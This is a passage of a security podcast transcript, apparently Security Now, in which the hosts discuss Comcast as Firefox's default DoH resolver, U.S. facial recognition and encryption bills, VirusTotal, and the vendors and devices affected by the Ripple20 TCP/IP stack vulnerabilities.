Tommy said, quoting him, he said:  "There are two ways in which encrypted DNS can be enabled.  The first way is to use a single encrypted DNS server as the default resolver for all apps on the system."  He says:  "If you provide a public encrypted DNS server, you can now write a network extension app that configures the system to use your server.  Or, if you use Mobile Device Management to configure enterprise settings on devices, you can push down a profile to configure encrypted DNS settings for your networks."



He says:  "The second way to enable encrypted DNS is to opt-in directly from an app.  If you want your app to use encrypted DNS, even if the rest of the system isn't yet, you can select a specific server to use for some or all of your app's connections."  So, I mean, that's nice, but it's very developer-centric in the way that they're approaching it.  So it's not as much as we would like, I mean, what you'd like is just to have your iOS device use Cloudflare or NextDNS or 1.1.1.1 or any of the increasing number of DoH servers.  So anyway, maybe they'll add that for us to iOS in the future.  I guess we'll just have to wait and see how it goes.



And now for some less than wonderful news.  I wrote here Mozilla plus Comcast plus DoH.  I'm not sure whether that's strange bedfellows or strained bedfellows.  But the disquieting news is that Comcast's Xfinity broadband Internet service will be joining Firefox's Trusted Recursive Resolver program, you know, TRR.  And somewhat even more worrisome, it will be enabled, and Comcast will be the default DoH resolver for all Firefox users on Comcast's network.  So in other words, for all Firefox...



LEO:  What?



STEVE:  Yeah, I know.



LEO:  That stinks.  I'm sure they gave them a packet of money.



STEVE:  That was my first thought, Leo, was that Mozilla needs financial support.  Whenever I buy something - I've never mentioned this.  Whenever I buy something through PayPal, often there's a little "Would you like to toss in a dollar to Mozilla?"  And I invariably say yeah, thank you.  I'm happy to do that as a Firefox user.  So I'm thinking, wait a minute.  What has happened now is that, if you are a Firefox user, and you haven't done anything one way or the other, and you're at  Comcast ISP, your Firefox will start using Comcast's DoH resolver by default.



LEO:  That's not nice.



STEVE:  So let's enumerate the many things that are fundamentally wrong with this picture.  First, recall that it was in 2014 that Comcast was caught injecting unsolicited advertisements into its customers' browsing.  And the U.S.'s broadband privacy rules were killed by Congress in 2017 when Congress passed a bill allowing ISPs to collect and sell web surfing data.



Prior to President Trump's signing of that bill into law, as he immediately did with some flourish, the FCC's previous privacy rules would have required home Internet and mobile broadband providers to first obtain consumers' opt-in consent before selling or sharing web browsing history, app usage history, and other private information with advertisers and other companies.  But lawmakers used their authority under the Congressional Review Act to pass a joint resolution ensuring that the rules "shall have no force or effect" and that the FCC cannot issue similar regulations in the future.



Then recall how last year, as we talked about at the time, Comcast went ballistic and patently lied in Congressional testimony about the move by the browser vendors to secure DNS.  Remember that set of slides we reviewed at the time?  It was like a PowerPoint presentation which was just full of nonsense that was created by Comcast and presented as part of Comcast's testimony to Congress.



And in a joint letter to Congress, of which Comcast was a signatory, the letter read:  "We would like to bring to your attention" - you, Congress - "an issue that is of concern to all our organizations.  Google is beginning to implement encrypted Domain Name System lookups into its Chrome browser and Android operating system through a new protocol for wireline and wireless service, known as DNS-over-HTTPS (DoH).  If not coordinated with others in the Internet ecosystem..."



LEO:  So infuriating.



STEVE:  "...this could interfere on a mass scale with critical Internet functions..."



LEO:  B.S.  I'm sorry.  Did I say that out loud?



STEVE:  Yes, good, I'm glad you did, "...as well as raise data competition issues."  What?  They said:  "Google is unilaterally moving forward with centralizing encrypted domain name requests within Chrome and Android, rather than having DNS queries dispersed amongst hundreds of providers.  When a consumer or enterprise uses Google's Android phones or Chrome web browser, Android or Chrome would make Google the encrypted DNS lookup provider by default, and most consumers would have limited practical knowledge or ability to detect or reject that choice."



LEO:  Just as you, the members of Congress...



STEVE:  Uh-huh, but now they're doing exactly the same thing; right?



LEO:  ...have no ability to detect B.S. at all.  Oh, man.



STEVE:  "Because the majority of worldwide Internet traffic, both wired and wireless, runs through the Chrome browser or the Android operating system, Google could become the overwhelmingly predominant DNS lookup provider.  Moreover, the centralized control of encrypted DNS threatens to harm consumers by interfering with a wide range of services provided by ISPs, both enterprise and public-facing, and others."  Blah blah blah.  Anyway, everyone gets the idea.



And so here's the thing that occurs to me when we talk about our ISP doing this.  Remember that locally resolved DNS has never been a privacy issue as far as the wider Internet is concerned.  When a consumer does use their own ISP's local DNS resolver, their queries never emerge onto the Internet.  As we know, the local resolver is also a cache, which is able to satisfy most queries without asking anyone else.  And when the local cache provided by the ISP doesn't contain the answer being sought, it and not the ISP's customer goes out onto the Internet to issue one or more queries of other DNS servers to obtain and then cache the answer on behalf of the customer.



In other words, the entire point of using DoH in the first place is specifically and only to blind the user's own ISP to the content of their DNS queries, which many people feel is none of the ISP's business.  My point is there's no privacy implication as far as the rest of the Internet is concerned when a user leaves their DNS settings alone and uses the ISP's local cache.  That doesn't go out on the Internet.  It's that we're not happy about the ISP snooping on our DNS queries.



So yeah, we would rather send it to Cloudflare or to Google or to NextDNS or to whomever.  We're telling our ISP to keep their nose out of our business.  And based on past evidence and behavior, it's clear that our ISPs are every bit as desperate to know our business as is every other entity out on the Internet.  They want to track our behavior and our actions.  So the speedy deployment of browser-based DoH, which frankly it's been surprising, I've talked about it in the past, just how quickly this happened.  It was inevitable that ISPs would as quickly as they could be bringing up their own DoH servers to recapture those DNS lookups that they were rapidly being blinded to.



And what's most distressing is that we're going to witness the tyranny of the default, swinging Firefox users away from Cloudflare and NextDNS, which was what Firefox was going to be doing, and initially to Comcast and probably eventually to other ISPs, which are all going to want to bringing up their own DoH servers just for this purpose.



Mozilla's announcement said:  "Mozilla, the maker of Firefox, and Comcast have announced Comcast as the first Internet Service Provider (ISP) to provide Firefox users with private and secure encrypted Domain Name System services through Mozilla's Trusted Recursive Resolver Program.  Comcast has taken major steps to protect customer privacy as it works to evolve DNS resolution."



Eric Rescorla, Firefox's CTO, said:  "Comcast has moved quickly to adopt DNS encryption technology, and we're excited to have them join the TRR program.  Bringing ISPs into the TRR program helps us protect user privacy online without disrupting existing user experiences.  We hope this sets a precedent for further cooperation between browsers and ISPs."



And for its part, Comcast has reaffirmed its commitment to the privacy of their users.  Their explicit statement about privacy highlights three points.  And maybe by saying it they're going to be bound by it.  I don't know.  They said:  "As your Internet Service Provider, we do not track the websites you visit or apps you use through your broadband connection.  Because we don't track that information, we don't use it to build a profile about you, and we have never sold that information to anyone.  Two, we do not sell, and have never sold, information that identifies who you are to anyone.  We also don't sell, and have never sold, your location data when you use our Xfinity Mobile service."  And third and final:  "We delete the DNS queries we have as an Internet Service Provider every 24 hours."



LEO:  Well, that's good if they really do all that.  I thought they were selling it.  I mean, they have the right to sell it.



STEVE:  Yeah, they do have the right to sell it.  They've said they wouldn't; but then we've all asked, okay, then, why are  you fighting so hard to be able to?



LEO:  Right.



STEVE:  So they are saying they're not doing it.  So let's hope they aren't.



LEO:  Well, you can still - it's just the default.  So I can still choose Cloudflare or...



STEVE:  Yes, yes, yes, yes.  And in fact that's exactly the point I wanted to make.  I wanted to, for our Comcast-connected, Firefox-using listeners, be aware that, if you care, Firefox will at some point - and Mozilla hasn't said when, this is just an announcement of this agreement - it'll switch over to Comcast, away from whatever it was using before.  So you may want to override that and switch back to some non-ISP provider, if it's something that you care about.



LEO:  Yeah.  That's so weird that they would [crosstalk].



STEVE:  Leo, I know.  Isn't it odd?  Yeah.  But it makes sense.  I mean, ISPs don't want to be blinded.  But on the other point, it was never really a security issue if you were using a local provider because your queries never left the ISP's network.  They stayed in-house.



LEO:  Right.  Mr. G?



STEVE:  So we have the very welcome Facial Recognition and Biometric Technology Moratorium Act.  It was proposed last Thursday by two senators and two representatives in Congress.  Although a growing number of U.S. cities has already been taking action to ban the government use of that technology, with Boston just last week becoming the 10th U.S. city to do so, this bill, if it were passed, would put in place the first nationwide ban on facial recognition technology.  And I don't know where this falls on political partisan lines, so maybe it's dead before it's even voted on.  Who knows?



But the sense is that the use of facial recognition technology, we've been talking about it a lot on the podcast, has sort of sprung up unbidden because it had suddenly become feasible and practical.  We got lots of computation.  We got lots of connectivity.  We got lots of storage in the cloud.  So, hmm, what could we do with all of that?  Oh, we've got lots of cameras, too.  So let's hook everything together and, yeah, that sounds like a good idea.  But the nation's lawmakers have never been given the opportunity to officially or unofficially weigh in on whatever limitations and guidelines, if any, should be imposed on this.  It just kind of happened organically.



LEO:  They probably want to know what Comcast thinks first before they vote.  Have to wait for that letter.  They'll tell you what to do.



STEVE:  We reserve the right.  The newly proposed bill would "prohibit biometric surveillance by the federal government without explicit statutory authorization and to withhold certain federal public safety grants from state and local governments" - ah, there's the stick - "that engage in biometric surveillance."  So that means that federal agencies would be barred from using biometric surveillance systems, which in addition to facial recognition can also include voice recognition.  Additionally, it would prohibit the use of federal dollars to be spent on facial recognition technology and "condition federal grant funding to state and local entities, including law enforcement, on those entities enacting their own moratoria on the use of facial recognition and biometric technology."



So there's no time limit in place.  It would continue until Congress passes a law to lift it, which is I think exactly the way it should be done.  Just say no until we decide how we want to treat it, how we feel about it, what restrictions to put on it.  And of course the privacy concerns around facial recognition have been one thing, and specifically, especially in today's climate, the inadvertent apparent racial bias repeatedly demonstrated by the technology, all of this came into focus earlier last week when the ACLU filed a complaint alleging that an African American man was arrested in Detroit after a facial recognition system falsely matched his photo with security footage of a shoplifter.



According to the ACLU, this is the first known example of misidentification through faulty facial recognition directly leading to a wrongful arrest.  Apparently the technology was simply believed.  The senior legislative counsel with the ACLU said:  "No one should have to go through what the Williams family has gone through.  It's past time Congress halted the use of face recognition and stopped federal money from being used to invest in invasive and discriminatory surveillance."



And coincidentally, a forthcoming research paper to be published by Springer Publishing of Berlin, Germany, bears the somewhat ominous title:  "A Deep Neural Network Model to Predict Criminality Using Image Processing."  What?  Anyway, it describes AI algorithms that can predict crime based only on a person's face.  I'm not kidding.  In response, at last count,  this was last night when I checked, 2,435 professors, researchers, practitioners, and students spanning all fields of anthropology, sociology, computer science, law, science and technology studies, information science, math, and more, including experts and academics from organizations including MIT, Microsoft, Harvard, and Google, had all signed an open letter denouncing this paper and calling it out for promoting racial bias.



And if anyone's interested their signed piece, I have a link.  It was published on Medium.com last Tuesday entitled "Abolish the #TechToPrisonPipeline," with the subheading "Crime Prediction Technology Reproduces Injustices and Causes Real Harm."  Anyway, it was published by the coalition - huh?



LEO:  It's like phrenology.  Like, oh, the bumps on this person's head tell me he must be a criminal type.



STEVE:  Exactly.



LEO:  You can't look at somebody's face and say they're a criminal.  Unless you just assume the skin tone tells all, which I bet is exactly what this is.



STEVE:  And that's the bias that we've seen, which is horrific.



LEO:  Exactly what this is.



STEVE:  And as we previously noted on the podcast, Microsoft, Amazon, and IBM, which all have developed their own facial recognition platforms, have all recently banned the sale of the technology to police departments and pushed for federal laws to regulate the technology.  So they're saying, yes, please regulate this.  We have the technology.  We've seen what it can do.  We need some guidance here.



Senator Markley, who was one of the four who cosponsored this, said in his statement about the proposed legislation:  "Facial recognition technology doesn't just pose a grave threat to our privacy, it physically endangers Black Americans and other minority populations in our country.  At this moment, the only responsible thing to do is to prohibit government and law enforcement from using these surveillance mechanisms."  So that's the happy proposed legislation.  We will see how that fares through the U.S. legislative process.  The not-so-happy legislative proposal is titled "The Lawful Access to Encrypted Data Act."



LEO:  At least they're being honest.



STEVE:  And there it is, folks, yeah.



LEO:  Right out in the open.



STEVE:  Yes, exactly, Leo.  "The Lawful Access to Encrypted Data Act."  Let's not call this the EARN IT, you know, we're going to take away Section 230 protection.  No.  So this new legislation was introduced by the U.S. Senate's Judiciary Committee Chairman Lindsey Graham, Senator Tom Cotton, and Marsha Blackburn.  They argued that ending the use of - and they use the term "warrant-proof" - encrypted technology would "bolster national security interests" and "better protect communities across the country."  They added that such encryption cloaks illicit behavior during criminal investigations into terrorists and other bad actors.



And of course, as we know, there's been no other single topic that has so captured my own interest and attention, along with the more recent question of managing the posting and presentation of counterfactual information on the web.  The question of whether encryption should remain warrant-proof is the issue of the day.  And it's going to be fascinating to watch this play out.  As we know, we already have last year's EARN IT Act, also introduced by Senator Lindsey Graham, which in the show notes I called a "can of slime," whose language begins:  "A bill to establish a national commission on online child exploitation prevention, and for other purposes."



LEO:  It's the other purposes that scare me.



STEVE:  Yeah, and some other things.  Don't worry about those.



LEO:  Yeah, you don't need to - pay no attention.



STEVE:  Yeah, just think about the kids.  And as we know, it threatens to revoke a non-complying company's legal protections under Section 230 which shields the company from criminal and civil liability for user-generated content.  I much prefer, if nothing else, a straightforward heads-up fight over what we're really talking about.



Tom Cotton, one of the bill's three co-sponsors, said:  "Tech companies' increasing reliance on encryption has turned their platforms into a new, lawless playground of criminal activity.  Criminals from child predators to terrorists are taking full advantage.  This bill will ensure law enforcement can access encrypted material with a warrant based on probable cause and help put an end to the Wild West of crime on the Internet."



So, okay, good luck with that.  We all know, as has often been said on this podcast and others on the TWiT Network, that lawful users will obtain weaker privacy protection, while actual criminals who will be much more motivated to hide their elicit activity will simply switch to non-U.S. platforms that continue to provide warrant-proof encryption.



Oh, and in a somewhat bizarre carrot-and-stick, this latest attempt at legislation also directs - get this, Leo - our illustrious Attorney General Bill Barr to create a prize competition to award participants who create a lawful access solution in an encrypted environment.



Okay.  So we know that Apple or Signal or Facebook are not going to be signing up for that prize, though I suppose this might be an effort to spur some innovation to get some smaller players to propose technological solutions since Congress has been unable to get any of the actual purveyors of this technology to even consider doing so.  So anyway, we'll see how that goes.  Who knows?  None of this legislation ever seems to go beyond the proposal stage.  And I assume that's because, presumably, those who query members in Congress about their feelings and probable votes never get even close to imagining that those bills have a snowflake's chance of actually passing.



So again, at least this is just, as you said, Leo, it's telling the truth.  It's just saying, look, we want to end warrant-proof encryption.  What say ye?  And we'll find out because it's just been proposed.



Another legislative side, we have Michigan's state legislative house which just passed the - and I don't know why they had to do this, but I'm glad - the Microchip Protection Act.  Even though forced RFID chip implants for workers is not yet, thank goodness, an issue, the state of Michigan decided to join seven other states in getting out in front of this one by formally and preemptively outlawing compulsory microchip implants for employees.  Whoa.  Big Brother, anyone?



The legislation notes that, although there are only a few known U.S.-based companies embedding microchips in their employees - huh? - several job providers could be following soon, they said, including some businesses in Michigan.  So assuming that this legislation passes, which appears likely, Michigan would become the eighth state to explicitly outlaw compulsory chipping.  The existing seven states are California, Maryland, New Hampshire, North Dakota, Oklahoma, Wisconsin, and Utah.  All of those already prohibit the required implantation of a microchip in any person, for any reason, not just employees.



So I have a feeling that that's going to be, you know, taking all of this a step too far.  So, I mean, I guess, like, "for any reason," that would even mean like convicts and criminals and things.  It's like, no, we're not doing RFI tagging of people in this country.  I imagine that this is just the beginning.  We're a federation of states, so it's eight states now.  I would imagine we'll see something nationwide before long.



Oh, and I wanted to mention, just sort of as a heads-up, not to forget about VirusTotal.  A recent blog posting, a VirusTotal blog posting, announced a new addition to Google's multi-malware scanner.  I got a kick out of the title.  It was kind of some clever programmer-ese.  The blog was titled "VirusTotal += Cynet."  For those not conversation in coding, the "+=" expression happens to be one of my favorites.  It's a simplification of "a=a+b."  It should always be the goal of computer languages to both minimize writing errors and maximize reading ease.  So shortening "a=a+b" to "a+=b" is vastly easier to both write and to read.  It's easier to read because it explicitly reveals the programmer's intent to increase "a" by "b."



Now, it's true that the longer version does the same.  But the intent is much less clear.  And especially if the "a" expression happened to be some really complex thing.  You don't want to have to type that twice on both sides of the equal sign and then add a "b" to the end.  And if it's really long and complex, someone reading the code looks at it and thinks, wow, what's going on?  And then they have to very carefully make sure that the complex expression is in fact the same on both side of the equal sign.  Anyway, "+=" is a win.



So Cynet is a new addition to VirusTotal, and the VirusTotal blog quoted Cynet, saying:  "Cynet 360 is an autonomous breach protection platform that includes multilayered antimalware capabilities including AI-based static analysis, process behavior monitoring, memory monitoring, sandboxing, and granular whitelisting, interlocking all together to protect against malicious executables, exploits, scripts, macros, malicious process injection, and other fileless attacks."



They said:  "Cynet 360 protection ranges across the entire malware lifecycle, identifying malicious attributes," blah blah blah.  Anyway, so that's just an ad for them.  But they are a good standup company, and they will now be contributing their input into things dropped into VirusTotal.  I wanted to mention it mostly to remind our listeners about VirusTotal, a service which I use and, frankly, would hate to be without.



Just the other day I needed some piece of long-abandoned software.  I don't now remember what it was.  So I went digging around the 'Net, and I ostensibly found it on Vetusware, V-E-T-U-S ware, which is Vetusware.com, which is an abandonware site that tends to collect abandonware, you know, arguably software which was once commercial, but which has been long abandoned by its publisher.  And I think there's actually been some legislation protecting those who use abandoned software, saying yeah, you have a legal right to do so.  Much as I wanted to trust the download that I found...



LEO:  Looks like the site has been abandoned.



STEVE:  Yeah.  Well, now, Leo, it looks a lot like mine, so easy there.



LEO:  I love the use of ASCII text characters for borders and shadows.  That is a pure ASCII [crosstalk], yes.



STEVE:  Yes, I do, too.  Anyway, so much as I wanted to trust the download, this is precisely how malware gets into people's machines, you know, downloading something that you think is okay, and it's not.  So I downloaded whatever it was I needed, inspected the package, checked file signatures, dates, and so forth.  I did as much due diligence as I could.  And for me, a key part of any such checking is always to drop any questionable file onto VirusTotal over at VirusTotal.com.  Sometimes it instantly knows it because it does a hash of it, and it had already checked the file of that hash.  But it's sometimes a good idea to refresh that.



And in this case I did, and I watched 73 different virus, you know, AV antimalware engines all reinspect that thing and say, yeah, far as we know, nothing wrong with this.  And as it turns out it was useful to me, and it was benign.  So anyway, I'm not suggesting that anyone should regard anything VirusTotal tells you as gospel.  But it's one additional piece of useful telemetry about anything you might have reason to question.  So just remember that it's always there, and it's free to use, and just a great resource for security-savvy people on the web.



A little bit of miscellany regarding Edge on Win7.  I mentioned it last week, and I heard you confirm it the day after, Leo, with Paul and Mary Jo.  As it happens, since then and now, I updated a Windows 7 machine of mine which had been offline for quite a while, and it did receive an offer to install Edge.  So Windows 7, we'd like to install Edge.  The Win update, it was interesting the way it came in.  It came in under Windows Update, which showed me that two important updates were available.  So it was important, but Edge was not selected for me by default.  So if I didn't do anything, if I just did the automatic express updates, I would not have received it.  But if I looked at the itemization of updates, saw that it was important, I would have gone, oh, yeah, I'd like to have Edge on my Windows 7 machine.  I could have selected it and installed it.  I did that, and it installed it, and it worked.



What I did think was interesting was that it was rather aggressive about copying Chrome's settings.  Since it of course is a Chromium-based browser, it really wanted to suck everything out of Chrome and take over for it.  And I did allow it to do so because I was just sort of curious to see how it would do.  And sure enough, it installed all the same add-ons, including Last Pass and uBlock Origin that I both had installed as add-ons in Chrome.  So anyway, I know that there are still lots of Windows 7 users out there, and I don't know why somebody who is using Chrome would also want Edge.  It's just one more browser.  But, you know, Microsoft has been telegraphing that they're going to be adding a bunch of features, like vertical tabs.  So maybe.



I also wanted to note, for those who are old-school NNTP newsgroup users, apparently there are about a thousand of you, since I think about a thousand copies of the Gravity newsreader have been downloaded since I added it to GRC's list of downloads.  I wanted to just give a quick heads-up that there's a new release of that.  I fixed a bug in the one that we had online, 3.0.9.  The bug was not mine.  A couple of weeks ago Gravity users, including myself, were unable to open several recent postings in the grc.spinrite.dev newsgroup, where I'm spending all my time.  Gravity would just crash.  It would just close, bang, whenever you touched on one or two of those posts.



And this is really where community-driven open source software really comes into its own.  Gravity, as we know, was abandoned, I think in 2010, quite a while ago.  But it is by far my favorite way of interacting with newsgroups.  And newsgroups are, by far, the best way I've ever found of working with a community of people who are interested in participating in the development testing of new code, which is what we are very busy doing at the moment.



So when my trusty old Gravity died a couple weeks ago, well, actually first remember that it died when the year switched to 2020.  There was just some code in there that, you know, it wasn't Y2K, it was Y2K20.  It just died.  So I needed to open up and fix it at that time.  I learned a little bit about Gravity, brought it into the fold.  I now have its source tree living with me.  And so when it crashed two weeks ago, I went back in, and I found a longstanding problem.



Somebody, the original author, I mean, this thing had never worked.  If you embedded two Base64 encodings into a posting, which is the way Thunderbird does things because Thunderbird has a newsreader also, and you tried to open that in Gravity, it would crash.  The original programmer forgot to put the length of a string into one of the string abstractions.  You know, when have we ever heard of that happening before?  And sure enough, it would crash.  If the Base64 decoder ran off the end of the first one and into the beginning of a second one, it would hit an equal sign which it regarded as a reserved character because Base64 uses that for padding, and it would explode.  So anyway, I fixed it.  And for anybody who did download a copy of Gravity, you'll want to go update your copy just so that you have the latest and greatest.



Also, a bit of feedback from a listener, BlueLED.  He tweeted me:  "@SGgrc Can you tell us again what was the brand and model of the switch/router you were using for traffic control?  It was not a common brand, as I remember."



Okay.  So the software is pfSense, P-F-S-E-N-S-E.  It is open source, based upon FreeBSD Unix, and it is wonderful.  It can be loaded onto any Intel-based PC hardware which FreeBSD supports. And it supports everything, and going way back in time.  So you do need to have some fast network interfaces if you're going to make it your router because of course all of your LAN traffic would be coming and going through it.  So that's one requirement.  But it is perfect for a DIY user.



You could also get any cute little inexpensive Intel-based fanless turnkey box and load pfSense onto it, and you're up and running with a feature-packed router.  But for someone who wants a pfSense-based appliance, the company Netgate offers a turnkey, ready-to-go pfSense-based router.  Actually, they have a family of them.  The smallest, least expensive is the SG-1100, no relation.  It sells for $179.  It's the one that I'm using at several of my locations.  I think it runs up to 895Mb, so just shy of a gig of measured throughput.  So it should handle anybody who has a 300MB connection as I do from Cox.  Anyway, Netgate, N-E-T-G-A-T-E, dot com.  And I've got the links in the show notes for anyone who's interested.



Work on SpinRite's AHCI driver is continuing.  We're making rapid progress.  I don't have anything specific yet to announce, though I did notice that more than 1,500 people had grabbed a copy of our new InitDisk utility, which I mentioned last week, for reformatting USB drives.  So I'm glad it's been useful to people.



LEO:  Steve?



STEVE:  So Ripple20 Too, as in also, more, mucho.



LEO:  Oh, boy.  Yikes.



STEVE:  Details, yeah.  Last week was our disclosure and discussion of the very worrisome Ripple20 discovery that a highly used for several decades embedded TCP/IP stack was riddled with at least 19 vulnerabilities, several of the worst being very serious no-user-action-required remote code execution enablers.  I entered that discussion last week by noting that the Internet's already target-rich environment just got a whole lot richer.  So we're back to this important topic this week as a great many more details of the impact of this sweeping, industry-wide problem are coming to light.  And the sense is we still don't know the full scope of it.



But our often-cited friends over at BleepingComputer have pulled together the most comprehensive coverage I've seen.  So I'm going to start by paraphrasing a bit of what they've written because it nicely characterizes the industry's present situation.  Bleeping Computer wrote:  "The dust is far from settled following the disclosure of the 19 vulnerabilities in the TCP/IP stack from Treck, collectively referred to as Ripple20, which could help attackers take full control over vulnerable devices on the network.



"Treck's code is fundamental for the embedded devices it is implemented on because it bestows network communication to them and is present on gadgets used in a variety of sectors:  technology, medical, construction, mining, printing, energy, software, industrial control systems, telecom, retail, and commerce.



"The company has notified its customers and issued patches, but a week after the Ripple20 announcement from security research group JSOF, the full impact still remains unclear.  This is because Treck's code is licensed and distributed under different names, or serves as a foundation for a new network stack."



And I'll interject that it turns out that it's also internationalized, resold, and rebranded under completely different names, as well.  So it's very possible that a mid-chain OEM might not even know that their system is using vulnerable code that originated with Treck.  I mean, this is that whole - the reason they called it "Ripple" is that the nature of today's supply chain, where somebody could get this embedded in a chip, somebody then uses the chip, oh, look, it's IP-enabled.  It's like, yeah, they don't even know that it's Treck code in there because that affiliation didn't survive the embedding process.



So, "Concerted efforts from national-level cybersecurity agencies and private companies in the field are ongoing to identify businesses with products vulnerable to issues in the Ripple20 vulnerability set.  What is clear at the moment," they wrote, "though, is that the healthcare industry is particularly affected and should be on high alert."  And of course this is interesting because it's sort of the nature of embeddedness.  There is some provider that created the core embedded chips which either one or multiple major biomedical firm used.  And, you know, an engineer chose it.  It did the job.  It was exactly that.  It was a turnkey solution that would connectivity-enable their infusion pumps, for example.  And then they just kept using it.



And they used it for years and years because it stayed available, and it worked, and they never had any problems with it.  And so as they evolved their line of biomedical equipment, they just kept using it.  And when they added some other piece of equipment, they said, hey, let's just use the same chip.  Why not?  It works.  And the Treck products do work.  The problem is they've also got vulnerabilities.



So the healthcare industry has been put on high alert about any of their connected stuff.  Elad Luz, head of research at CyberMDX, which is a company focused on security and medical devices and is involved in identifying vulnerable products, told BleepingComputer that their initial investigation placed the healthcare industry's exposure at more than seven times that of manufacturing.  And that was confirmed with some numbers by the security firm Forescout, who is also involved now in the effort.  On the day of the disclosure, Forescout revealed that there were six times more vulnerable healthcare-related equipment than in the retail sector.



So what are the numbers?  They have identified 52 - I have a hard time saying it - 52,935 devices matching the Treck signatures in the healthcare vertical segment.  8,347 devices in the retail segment.  7,333 devices in manufacturing.  5,904 devices in government.  5,225 in financial services.  And generically an additional 11,346 in other fields.  They explained from their analysis, Forescout did, that the most common device types running Treck stacks were infusion pumps, and then second were printers, then UPS systems, networking equipment, point-of-sale devices, IP cameras, video conferencing systems, building automation devices, and industrial control systems.



They added that to exploit Ripple20 vulnerabilities, an attacker needs a direct connection to an affected device or a routed path to one on an internal network.  This means devices directly connected to the Internet, of course, are those most at risk, just like routers.  An attacker could target these devices first, compromise the device, then move laterally within the network to access or infect other devices.  So, for example, the last thing you want is your IP camera to be on the Internet with a port.  Even if the port is not a server.  If it's not visible, it is still, if it's got a port connected, these vulnerabilities can get there because, for example, an unsolicited DNS reply can be used to compromise one of these Treck stack-based devices.



So as an example of the impact of the vulnerabilities, Forescout did a series of Shodan searches for 37 specific known vulnerable device models where the model number was known, encompassing 18 different vendors.  That included printers, IP cameras, video conferencing systems, networking equipment, and industrial control devices.  That Shodan search revealed 15,000 currently Internet-connected instances of these devices with Treck stacks that could be immediately compromised by anyone on the Internet.  And when you include networking equipment and industrial control systems, especially when you hear what some of these industrial control systems are, that's a problem.



So compared to the number of known vulnerable devices, estimated in the many hundreds of millions, 15,000 is not a big number.  But that was only a scan for specific known vulnerable signatures.  And after all, it only takes one exposed device on the network of, say, a nuclear power plant, or managing a nation's electric power grid, to ruin everyone's day.  It is estimated that the actual number of publicly exposed Internet-connected devices is a great deal higher.  They just aren't readily identifiable from a Shodan scan, or they have not been identified yet.  So that remains for the short-term foreseeable future.



BleepingComputer assembled a nice, almost alphabetical list - I alphabetized it a bit - of known affected manufacturers and their devices.  To give our listeners some sense, we have the big iron provider, Aruba Networks.  A preliminary advisory from them based on an initial investigation is available from them.  It lists their Level 2 and Level 3 switches produced under the Aruba or HP ProCurve brand names.



Baxter U.S.  They're a healthcare company.  They announced that some of their Spectrum Infusion System's Wireless Battery Modules are impacted by Ripple20 because they run something known as the Digi NET+OS which uses Treck's TCP/IP stack.  And we'll talk about Digi in a second.  They list five different WiFi wireless battery modules with b, b/g, a/b/g/n and so forth.  And we know what those are.  Those are the WiFi designations.  So they've got the Ripple20 Treck stack in them.  And I don't know what mischief somebody could get up to, but it's not a vulnerability you probably want in something which is presumably infusing drugs into you at a prescribed pace.



LEO:  Yeah.  Let's not hack that.



STEVE:  Yeah.  Braun, another medical and pharmaceutical device company, notified their purchasers that vulnerable Treck code is present in their Outlook 400ES Safety Infusion Pump, and no other products are affected in the Ripple20 issues.  A Braun advisory stated that:  "To date, Braun has received 24 patches from Treck to resolve vulnerabilities in the software."  They said:  "We've analyzed the patches and determined that 20 of them are not applicable to the Outlook 400ES platform.  Four remaining patches continue to be analyzed to determine the scope."  So that's good.  That says that Braun purchased directly from Treck.  Treck has been responsible.  They've resolved the problem, and they're notifying their direct customers.  Of course, the problem is with the indirect customers that Treck has no way of notifying.  And we don't know if the direct customers have a way of notifying their down-the-chain OEMs.



Beck/HMS Industrial Networks is another.  And rather than going through this in detail, to give our listeners a sense, Carestream has a bunch of products that are vulnerable.  Caterpillar is not being forthcoming with details, but an undisclosed number of Caterpillar's products are known to be vulnerable.  I don't know what that means.  Cisco also.  And, boy, Cisco is apparently a user of this Treck stack.  Routing and switching, enterprise and service provider.  ASR 5000 series routers.  GGSN Gateway.  GPRS Support.  IP Services Gateway.  These are just a whole bunch of Cisco.  System Architecture Evolution Gateway.  So yikes.  And they're still investigating and will be showing more of them.



Dell said Dell products are inherited from an Intel component that is present in Dell Client Platforms and from Teradici (T-E-R-A-D-I-C-I) firmware and remote workstation cards in Dell Precision and Dell Wyse (W-Y-S-E) Zero Client products.  So, interesting that they're saying they inherited it through an Intel component.  That's interesting.  They've released fixes and encourage customers to prioritize updating their systems to the latest firmware.



Also Digi International has something called NET+OS 7, which is a resold platform.  It's got problems, and there's one, two, three, four, five, six, seven, eight, I don't know, 12 or so of  those, and a whole bunch of model numbers on each of those.  New firmware versions are available.  They're being responsible.  But it's up to people to install them.  And the multinational power management company Eaton announced in a security bulletin that its products rely on Treck's library to implement IPv4, IPv6, UDP, DNS, DHCP, TCP, ICMPv4.  Remember that all of those were vulnerable protocols of Treck's library, and they are vulnerable to multiple Ripple20 issues.



Unfortunately, these things have sort of scary names.  The CL-7 voltage regulator control.  The Form 4D recloser control.  The Form 6 recloser control.  Edison Idea and IdeaPLUS relays, all variants are vulnerable.  The metered input power distribution units, the metered outlet power distribution units, the managed power distribution units, and the high-density power distribution units.  So, yeah.  Let's hope there's no grid outages anytime in the near future.



Green Hills Software.  HCL Technologies.  Hewlett Packard Enterprise.  HP Inc. and Samsung.  HP Laser, LaserJet Pro, the HP Neverstop Laser.  Maybe it should stop while you update its firmware.  The Samsung ProXpress, the MultiXpress, the DeskJet, OfficeJet, OfficeJet Pro, Ink Tank, Smart Tank.  You're in the tank.  No.  Anyway.  You definitely want to see about getting updated firmware.  We've talked about the problem with printer firmware vulnerabilities in the past.  It is a favorite pivot point.  There was just also something recently about printers opening a port to the public Internet.  You don't want it to be one of these printers, or one that hasn't had its firmware updated, because that would be bad.  That's a way to get in and pivot into your network.



Also Intel.  Some versions of Intel's Active Management Technology (AMT), if I'm not mistaken, that's part of the baseband technology in the motherboard.  So which is to say that Intel is using the Treck stack in the motherboard baseband firmware to do all of the active management technology which, as we know, cannot be turned off.  So let's hope the people have those servers, the ports that have those servers are not facing the public on the Internet.  That would not be good.



MaxLinear, Rockwell Automation, Schneider Electric.  Lots of vulnerabilities across Schneider's line of UPS devices.  Teradici I mentioned before.  They've acknowledged the problem, and I'm sure they're notifying their customers.  Xerox B205, B210, and B215, whatever those are.  They've got firmware updates, but of course you've got to go get them.  And then Zuken Elmic, a company that distributes Treck's stack under the name KASAGO (K-A-S-A-G-O).  So if you don't know Treck, you may know that name.  That's an example of one of these redistributors of the Treck stack under a different name.



